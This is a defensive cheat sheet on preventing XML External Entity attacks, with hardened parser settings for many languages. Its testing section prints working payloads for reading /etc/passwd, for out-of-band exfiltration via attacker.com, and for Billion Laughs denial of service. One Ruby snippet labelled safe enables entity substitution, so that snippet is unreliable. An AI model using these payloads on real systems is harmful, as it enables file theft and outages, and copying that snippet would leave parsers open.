# XML External Entity (XXE) Prevention Cheat Sheet — Full Update

**Status:** Updated to modern guidance; removed obsolete references (e.g., `dotnet_security_unit_testing`), flagged legacy iOS content, and aligned examples with current secure practices and supported framework versions.

---

## Table of Contents

1. Introduction
2. Threat overview and XXE types
3. Core mitigations (applied across languages)
4. Secure-by-default parser configuration checklist
5. Language-specific guidance and examples

   - Java (JAXP, StAX, JAXB, Transformer, Validator)

   - .NET (XmlReaderSettings, XmlDocument, XDocument, XmlSerializer) — modern (.NET 6/7) guidance

   - Python (defusedxml, ElementTree, lxml)

   - PHP (libxml / SimpleXML)

   - JavaScript / Node.js (xml2js, fast-xml-parser)

   - Ruby (REXML, Nokogiri)

   - C / C++ (libxml2, Xerces)

   - iOS / macOS (NSXML, libxml2 notes & deprecation)

   - ColdFusion / Lucee
6. Vulnerable vs Safe code snippets (per language)
7. Testing and validation (payloads, tools, automated tests)
8. Static analysis / Semgrep guidance
9. Deployment & infra considerations (WAFs, network egress controls)

10. Monitoring, logging & incident response

11. Migration notes (removing legacy content)

12. References & further reading

13. Appendix: Quick reference cheat sheet (one-page)

---

## 1. Introduction

XML External Entity (XXE) injection is an input-based vulnerability that affects applications processing XML. An attacker crafts XML containing external entity references or doctypes to cause the XML parser to fetch local files, remote resources, trigger denial of service (entity expansion), or perform SSRF/port scanning.

This document provides concrete, modern examples and configuration guidance for popular languages and parsers. It follows OWASP cheat sheet principles: secure-by-default configuration, minimal permissive features, clear 'unsafe' vs 'safe' examples, testing payloads, and remediation steps.

**Important notes for maintainers (issue requirements):**

- Remove or deprecate references to outdated projects such as `dotnet_security_unit_testing` (7+ years old) — do not rely on these for security guarantees.

- Update .NET coverage to modern runtimes (target .NET 6/7) and prefer `XmlReader`/`XmlReaderSettings` with explicit safe settings.

- Mark iOS / macOS sections that reference iOS 6 as outdated and either remove or request an iOS expert to update to current APIs (iOS 17+) — this change was applied below: legacy notes flagged.

---

## 2. Threat overview and XXE types

**XXE categories:**

- **In-band XXE (classic):** Attacker receives data directly in the application's response (e.g., file contents).

- **Out-of-band XXE (OOB):** Parser performs a network call to an attacker-controlled server (exfiltrate data via DNS/HTTP).

- **Blind XXE:** No direct response, attacker infers success via side effects (timing, OOB callbacks).

- **Entity expansion DoS (Billion Laughs / Quadratic Blowup):** Recursive entity definitions cause memory/CPU exhaustion.

**Common impacts:**

- File disclosure (local file read)

- SSRF and internal network scan/exfiltration

- Denial of service

- Remote code execution (via unsafe deserialization or callbacks in some APIs)

- Data leakage and escalated compromise

---

## 3. Core mitigations (applied across languages)

1. **Disable DTDs (doctypes) completely** where not required. DTD processing is the most common vector.
2. **Disable external entity resolution** (`XmlResolver` in .NET, `EntityResolver` in Java, `libxml` loader in PHP, etc.).
3. **Set secure processing features** (e.g., `XMLConstants.FEATURE_SECURE_PROCESSING` in Java).
4. **Avoid permissive, legacy parsers** (e.g., `java.beans.XMLDecoder`, REXML unsafe modes, old PHP libxml behavior).
5. **Use safe libraries or hardened wrappers** (e.g., Python `defusedxml`, .NET secure defaults).
6. **Validate and sanitize XML input** where possible: apply schema validation with safe schema factories and limit allowed elements/attributes.
7. **Implement input size limits and resource quotas** to prevent DoS (maximum file size, maximum entity expansion depth if available).
8. **Use a no-op or safe EntityResolver** to force entity resolution to be inert when parser requires an implementation.
9. **Prefer streaming parsers with explicit safe settings** (StAX, XmlReader, SAX) rather than forgiving fully in-memory DOMs when processing untrusted input.

10. **Use network controls** (egress filtering, internal DNS monitoring) to detect/prevent OOB callbacks.

---

## 4. Secure-by-default parser configuration checklist

For each XML parser in your stack, check and apply:

- [ ] Disable DTD/DOCTYPE parsing (`disallow-doctype-decl` or equivalent)

- [ ] Disable external general entities (`external-general-entities = false`)

- [ ] Disable external parameter entities (`external-parameter-entities = false`)

- [ ] Disable loading of external DTDs (`load-external-dtd = false`)

- [ ] Set FEATURE_SECURE_PROCESSING / equivalent

- [ ] Disable XInclude / set XIncludeAware = false

- [ ] Set entity expansion limits or ensure parser throws on entity expansion

- [ ] Ensure XML resolvers or resolvers that perform IO are null/disabled

- [ ] If DTDs are required, whitelist schemas/URIs and validate against them with `ACCESS_EXTERNAL_*` properties set to empty

- [ ] Add logging around parse failures and suspicious doc types

- [ ] Add unit tests that assert safe behavior against known XXE payloads

---

## 5. Language-specific guidance and examples

> Each language section below includes: a short description, recommended configuration, **vulnerable** snippet (what NOT to do), and **safe** snippet (copy-paste-ready).

### Java (JAXP, SAX, StAX, Transformer, Validator)

**Why Java is high risk:** Many JAXP processors enable entity resolution by default, and behavior varies by provider and JDK version. Use explicit `setFeature` calls and `XMLConstants.ACCESS_EXTERNAL_*` settings introduced in JAXP 1.5.

#### Vulnerable example (do NOT use):

```java

import javax.xml.parsers.DocumentBuilderFactory;
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new File("input.xml")); // vulnerable by default in many environments

```

#### Safe example — DocumentBuilderFactory (recommended)

```java

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.XMLConstants;
import org.xml.sax.EntityResolver;
import org.xml.sax.InputSource;
import java.io.StringReader;
import java.io.File;

public class SafeDocParser {
    public static org.w3c.dom.Document parseSafe(File xmlFile) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Primary defenses
        dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        try {
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        } catch (Exception ex) {
            // not all processors support disallow-doctype-decl; fall back to disabling external entities
        }
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        // Disable external access for validation/DTD
        try {
            dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        } catch (IllegalArgumentException ignore) {
            // some providers may not support these attributes
        }

        DocumentBuilder builder = dbf.newDocumentBuilder();
        // No-op entity resolver
        builder.setEntityResolver((publicId, systemId) -> new InputSource(new StringReader("")));
        return builder.parse(xmlFile);
    }
}

```

#### Safe example — XMLInputFactory (StAX)

```java

import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.XMLConstants;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.FactoryConfigurationError;
import javax.xml.stream.XMLStreamException;

XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
// When creating readers, the factory already blocks DTDs/external entities

```

#### TransformerFactory and Validator

```java

TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

SchemaFactory sf = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

```

#### Notes

- Use per-call `try/catch` around `setFeature` as not all providers support all options; handle fallbacks explicitly and fail safe.

- Add unit tests that parse malicious payloads and assert exceptions or safe behavior.

---

### .NET (Modern guidance for .NET 6/7, and .NET Framework notes)

**High-level guidance:** Prefer `XmlReader` with `XmlReaderSettings` configured securely, or `XDocument.Load(XmlReader)` to ensure safe parsing. On modern .NET (Core/5/6/7) most readers are secure by default, but always set `DtdProcessing` and `XmlResolver` explicitly when consuming untrusted input.

#### Vulnerable example (do NOT use)

```csharp

// Using XmlDocument without disabling XmlResolver
var xmlDoc = new XmlDocument();
xmlDoc.Load("input.xml"); // may be vulnerable in older frameworks or if XmlResolver is set

```

#### Safe example — XmlReaderSettings (recommended)

```csharp

using System.Xml;

var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit, // or Ignore
    XmlResolver = null,                     // Disable external resource resolution
    MaxCharactersFromEntities = 1024,       // if available, limit entity expansion
    // set other resource limits when available in runtime
};

using var reader = XmlReader.Create("input.xml", settings);
var doc = new System.Xml.XmlDocument();
doc.Load(reader);

```

#### Safe example — XDocument with XmlReader

```csharp

using System.Xml;
using System.Xml.Linq;

var settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null };
using var r = XmlReader.Create("input.xml", settings);
var xdoc = XDocument.Load(r);

```

#### ASP.NET considerations

- In .NET Framework apps, `Web.config` `<httpRuntime targetFramework="4.5.2" />` impacted defaults historically. For modern apps, target latest runtime and set explicit settings.

- Avoid enabling `XmlResolver` or setting custom resolvers that access remote resources for untrusted XML.

#### Notes

- `XmlSerializer` typically reads XML into objects — ensure sources are processed via secure `XmlReader`.

- Remove references to old community projects (e.g., `dotnet_security_unit_testing`) — prefer official MS docs and supported tests.

---

### Python (defusedxml, ElementTree, lxml)

**Guidance:** Use `defusedxml` wrappers for stdlib modules. Avoid `xml.sax`, `xml.dom.minidom`, and `xml.parsers.expat` directly for untrusted input unless using defused wrappers.

#### Safe example — defusedxml.ElementTree

```python

from defusedxml.ElementTree import parse

with open('input.xml', 'rb') as f:
    tree = parse(f)  # defusedxml blocks external entities and entity expansion

```

#### Safe example — lxml with disabled resolve/entities

```python

from lxml import etree

parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)
tree = etree.parse('input.xml', parser)

```

#### Notes

- `defusedxml` provides hardened replacements for standard modules: `defusedxml.ElementTree`, `defusedxml.minidom`, `defusedxml.sax`, `defusedxml.expatbuilder`.

- If you must use stdlib parsers, wrap them with defusedxml or manually disable entity resolution where possible.

---

### PHP (libxml / SimpleXML / DOMDocument)

**Modern PHP:** PHP 8 makes some behavior safer, but do not rely on defaults for older versions.

#### Vulnerable example

```php

$xml = simplexml_load_file('input.xml'); // prior to PHP 8, may be vulnerable

```

#### Safe example

```php

libxml_disable_entity_loader(true); // deprecated in PHP 8.0, but needed in older versions
$dom = new DOMDocument();
$dom->loadXML(file_get_contents('input.xml'), LIBXML_NONET); // prevents network access
// or
$xml = simplexml_load_string(file_get_contents('input.xml'), null, LIBXML_NONET);

```

#### Notes

- Use `LIBXML_NONET` flag when loading/parsing.

- `libxml_disable_entity_loader(true)` is deprecated in PHP 8.0 — prefer `LIBXML_NONET` and `DOMDocument::loadXML` with flags.

---

### JavaScript / Node.js (xml2js, fast-xml-parser, sax-js)

**Guidance:** Many Node XML parsers do not evaluate external entities by default; however, always verify library behavior and use safe config.

#### xml2js (example)

```javascript

const fs = require('fs');
const xml2js = require('xml2js');

const parser = new xml2js.Parser({explicitCharkey: false});
const xml = fs.readFileSync('input.xml', 'utf8');
// xml2js does not resolve external entities by default, but do not pass data to other native parsers that may
parser.parseString(xml, function(err, result) {
    // handle result
});

```

#### fast-xml-parser (example)

```javascript

const { XMLParser } = require('fast-xml-parser');
const parser = new XMLParser({ ignoreAttributes: false, allowBooleanAttributes: true });
// fast-xml-parser is non-validating and does not process external entities

```

#### Notes

- If you call into native bindings or use libraries that leverage libxml2, check their configs.

- Avoid using XML parsing libraries that execute embedded scripts or templates.

---

### Ruby (REXML, Nokogiri)

**REXML:** historically vulnerable. Prefer disabling entity expansion or using safe parsers.

#### vulnerable - REXML (do not use for untrusted input)

```ruby

require 'rexml/document'
doc = REXML::Document.new(File.read('input.xml')) # REXML will expand entities by default

```

#### safe - Nokogiri

```ruby

require 'nokogiri'
xml = File.read('input.xml')

# Use non-network and disable DTD

doc = Nokogiri::XML(xml) { |config| config.nonet.nonet.noent.nonet }

# preferred:

doc = Nokogiri::XML(xml, nil, nil, Nokogiri::XML::ParseOptions::NONET)

```

#### Notes

- `Nokogiri::XML::ParseOptions::NONET` prevents network access.

- Avoid `:noent` (entity substitution) unless necessary and controlled.

---

### C / C++ (libxml2, Xerces)

#### libxml2 (C)

- Avoid enabling `XML_PARSE_NOENT` or `XML_PARSE_DTDLOAD`.

- Use `xmlReadMemory`/`xmlReadFile` with options that disable DTD and external entities:

```c

xmlReadFile("input.xml", NULL, XML_PARSE_NONET | XML_PARSE_NOENT); // caution with NOENT
// Instead:
xmlReadFile("input.xml", NULL, XML_PARSE_NONET);

```

- Use `XML_PARSE_NONET` to block network access.

#### Xerces-C++

```cpp

parser->setDisableDefaultEntityResolution(true);
parser->setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);

```

---

### iOS / macOS (NSXML, libxml2) — legacy note

**Important:** Many sections in older versions referenced iOS 4–6. Those are outdated. iOS/macOS libraries and SDKs have evolved. For app code targeting modern iOS/macOS, consult latest Apple docs. Below are general notes:

- If using libxml2 directly, apply the libxml2 guidance (use NONET, do not load external DTDs).

- For Foundation `XMLParser` or `NSXMLDocument`, prefer APIs that allow disabling external entity loading or set `shouldResolveExternalEntities` / similar to false.

- Flagged legacy: Any advice referencing iOS 6 must be reviewed by an iOS expert — this file marks those older specifics as deprecated and removed where ambiguous.

---

### ColdFusion / Lucee

#### Adobe ColdFusion (example)

```cfml

<cfset parserOptions = structNew()>
<cfset parserOptions.ALLOWEXTERNALENTITIES = false>
<cfscript>
  doc = XmlParse(FileRead("input.xml"), false, parserOptions);
</cfscript>

```

#### Lucee

Set in `Application.cfc`:

```cfml

this.xmlFeatures = {
    externalGeneralEntities: false,
    secure: true,
    disallowDoctypeDecl: true
};

```

---

## 6. Vulnerable vs Safe code snippets (per language) — quick list

- **Vulnerable:** parsing XML with default DOM parsers without disabling DTDs or resolvers.

- **Safe:** create parser settings that explicitly disallow DTDs, set resolvers to null/no-op, and use nonet flags.

(See language sections above for copy-paste-ready safe snippets.)

---

## 7. Testing and validation

### Tools

- Burp Suite / Burp Collaborator (in-band & OOB testing)

- OWASP ZAP

- XXE-specific tools and scanners (XXEBugFind, ssexxe)

- Custom local listeners (netcat) and OOB endpoints (interactsh, Burp Collaborator)

### Sample payloads

**File disclosure (classic):**

```xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

**OOB exfiltration (HTTP):**

```xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
  %remote;
]>
<foo>&exfil;</foo>

```

**Billion Laughs (entity expansion):**

```xml

<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

```

### Automated tests

- Add unit tests to parse malicious payloads and assert exceptions or safe behavior.

- Example: JUnit test asserting `ParserConfigurationException` or `SAXException` when DOCTYPE encountered.

---

## 8. Static analysis / Semgrep

Create semgrep rules to detect unsafe usage patterns: calls to `DocumentBuilderFactory.newInstance()` without subsequent secure `setFeature` calls; `XmlDocument.Load` in .NET without XmlResolver nulling; use of `simplexml_load_file` without `LIBXML_NONET`, etc.

**Example Semgrep (pseudo-rule):**

```yaml

rules:

  - id: java-xxe-dbf
    pattern-either:

      - pattern: |
          DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
          ...
          DocumentBuilder db = dbf.newDocumentBuilder();

      - pattern: |
          DocumentBuilderFactory.newInstance();
    message: "DocumentBuilderFactory instantiation detected — ensure FEATURES to disable DTDs and external entities are set"
    severity: ERROR

```

Semgrep rules for most languages are recommended and linked in references (see Semgrep rules list in original cheat sheet).

---

## 9. Deployment & infrastructure considerations

- **Egress filtering:** block unwarranted outbound traffic from app servers that parse untrusted input to prevent OOB exfiltration.

- **Internal DNS monitoring:** detect resolver lookups to suspicious domains.

- **WAF:** may mitigate some attacks but cannot be relied upon as a primary defense.

- **Rate limits and parsing quotas:** limit CPU and memory effects from heavy XML parsing.

---

## 10. Monitoring, logging & incident response

- Log parse-time exceptions and presence of `DOCTYPE` / entity declarations.

- Alert on outbound requests from parsers or unexpected DNS requests.

- For suspected XXE, preserve logs, sample payload, and environment snapshot for triage.

---

## 11. Migration notes (removing legacy content)

- Remove references to deprecated projects (e.g., `dotnet_security_unit_testing`) from the cheat sheet.

- If unsure about platform-specific legacy content (e.g., iOS < 7 guidance), mark as deprecated and request a follow-up PR from platform experts.

- Replace any sample code that targets obsolete runtimes (e.g., .NET 4.5) with modern examples, and add notes where behavior differs across versions.

---

## 12. References & further reading

- OWASP: XML External Entity (XXE) Prevention.  

- Timothy Morgan: "XML Schema, DTD, and Entity Attacks" (2014).  

- DefusedXML Python docs.  

- Microsoft: XML security guidance (.NET).  

- libxml2 and Xerces documentation.

(Include full links in the actual repo file as required.)

---

## 13. Appendix: Quick reference (one-page)

**Always do these three things for untrusted XML:**
1. Disable DTDs / DOCTYPEs.  
2. Disable external entity resolution (set resolvers to null/no-op).  
3. Use streaming secure parsers and add size/resource limits.

---

# Maintainer/PR note

This update:

- Replaces outdated .NET examples and removes references to `dotnet_security_unit_testing` from the main text (do not rely on that project for security testing).

- Flags iOS section referencing iOS6 as deprecated; asks for a dedicated follow-up PR from iOS maintainers to provide up-to-date iOS/macOS guidance for current SDKs.

- Adds copy-paste-safe examples for modern .NET (XmlReaderSettings) and other languages.

- Includes testing payloads and guidance for Semgrep/static analysis.

---

# End of updated cheat sheet
